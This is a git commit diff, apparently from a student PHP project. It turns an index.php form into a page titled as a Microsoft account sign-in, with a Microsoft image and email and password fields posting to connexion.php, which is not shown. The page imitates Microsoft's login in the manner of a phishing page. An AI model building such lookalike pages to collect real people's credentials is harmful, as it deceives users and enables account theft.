972b575d95c375830273d6b4d3c993af8e4b2c47
Nino <ntorres-ulisses@turgot-paris.info>
2022-09-22 12:21:11 +0200

    Debut de la connexion en php

--- index.php
+++ index.php
@@ -4,13 +4,14 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Salem</title>
+    <title>Se Connecter à votre compte Microsoft</title>
     <link rel="stylesheet" href="css/style.css" />
+    <link rel="icon" type="image/png" sizes="25x25" href="img/logo.png" />
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet" />
 </head>
 
 <body>
-    <form>
+    <form method="POST" action="connexion.php">
 
         <img src="img/microsoft.jpg"><br /><br />
 
@@ -22,8 +23,8 @@
                 <div class="corps-formulaire">
                     <div class="gauche">
                         <div class="user-box">
-                            <input type="text" class="login-input" placeholder="E-mail, téléphone ou Skype" required autofocus />
-                            <input type="password" class="login-input" placeholder="Mot de passe" required />
+                            <input type="text" name="email" class="login-input" placeholder="E-mail, téléphone ou Skype" required autofocus />
+                            <input type="password" name="password" class="login-input" placeholder="Mot de passe" required />
                             <label class="checkbox">
                                 <input type="checkbox" value="remember-me" id="rememberMe" name="rememberMe"> Se souvenir de moi
                             </label><br /><br />
@@ -34,7 +35,7 @@
                 </div>
 
                 <div class="pied-formulaire" align="center">
-                    <button>Envoyer</button>
+                    <button name="connexion">Envoyer</button>
                 </div>
 
     </form>
